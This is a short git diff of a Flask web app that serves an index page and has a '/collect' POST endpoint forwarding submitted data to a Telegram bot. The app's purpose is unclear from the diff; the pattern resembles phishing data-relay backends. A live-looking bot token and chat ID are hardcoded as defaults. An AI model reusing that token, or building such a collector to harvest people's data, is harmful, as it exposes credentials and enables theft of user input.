@@ -10,6 +10,9 @@ CORS(app)
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8740001087:AAHh4ULCEovFIToZ1oK2gzaEV7599gHxpno")
 CHAT_ID   = os.getenv("CHAT_ID", "8784493975")
 
+HTML_FILE = "index.html"
+
+
 def send_to_tg(text: str):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
@@ -23,6 +26,7 @@ def send_to_tg(text: str):
     except Exception as e:
         print("TG error:", e)
 
+
 @app.after_request
 def add_no_cache(response):
     if response.mimetype == "text/html":
@@ -30,6 +34,12 @@ def add_no_cache(response):
         response.headers["Pragma"] = "no-cache"
         response.headers["Expires"] = "0"
     return response
+
+
+@app.route("/")
+def index():
+    return send_from_directory(".", HTML_FILE)
+
 
 @app.route("/collect", methods=["POST"])
 def collect():
@@ -72,9 +82,6 @@ def collect():
     send_to_tg(msg)
     return jsonify({"ok": True})
 
-@app.route("/")
-def index():
-    return send_from_directory(".", "index.html")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
